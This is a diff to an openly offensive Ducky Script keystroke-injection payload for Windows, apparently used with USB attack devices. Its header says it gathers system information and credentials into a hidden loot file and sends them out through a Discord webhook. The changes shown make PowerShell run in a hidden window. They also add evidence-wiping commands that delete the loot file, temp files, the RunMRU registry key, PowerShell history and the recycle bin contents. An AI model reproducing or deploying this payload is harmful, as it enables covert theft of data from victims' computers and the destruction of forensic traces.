@@ -1,10 +1,11 @@
 REM Title: A.S.E - Advanced_System_Exfiltration
 REM Author: LulzAnarchyAnon
-REM Description: This slow, and steady staged payload takes it's time and gleans detailed system information using Powershell, 
-REM Ducky script and notepad. First hidden powershells are opened in stages, and payloads are deployed to collect the target 
-REM computers enhanced system information, Then a notepad .txt file named loot is created with all the gleaned information, 
-REM and hidden in the Public Users folder C:\Users\Public\loot.txt Then the credentialS are exfiltrated using a Discord 
-REM webhook. In the final stage of the payload the notepad file is removed.
+REM Description: This slow, and steady staged payload takes it's time and gleans detailed system information using 
+REM powershell, Ducky script and notepad. First hidden powershells are opened in stages, and payloads are deployed to 
+REM collect the target computers system information, Then a notepad.txt file named loot is created with all 
+REM the gleaned information, and hidden in the Public Users folder C:\Users\Public\loot.txt The loot is then 
+REM exfiltrated using a Discord webhook. In the final stage of the payload the loot.txt file, the recycling bin 
+REM contents, the temp folder contents and powershell history are all deleted. 
 REM Target: Windows 10 & 11
 REM Props: iamjakoby, HAK5 and a huge shout out to O.MG!!!
 REM Version: 1.0
@@ -203,7 +204,7 @@ DELAY 1000
 
 GUI r
 DELAY 200
-STRING powershell 
+STRING powershell -windowstyle hidden    
 DELAY 200
 ENTER
 DELAY 500
@@ -412,6 +413,22 @@ DELAY 200
 ENTER
 DELAY 500
 STRING Remove-Item "C:\Users\Public\loot.txt"
+DELAY 500
+ENTER
+DELAY 500
+STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+DELAY 500
+ENTER
+DELAY 500
+STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+DELAY 500
+ENTER
+DELAY 500
+STRING Remove-Item (Get-PSreadlineOption).HistorySavePath
+DELAY 500
+ENTER
+DELAY 500
+STRING Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 DELAY 500
 ENTER
 DELAY 500
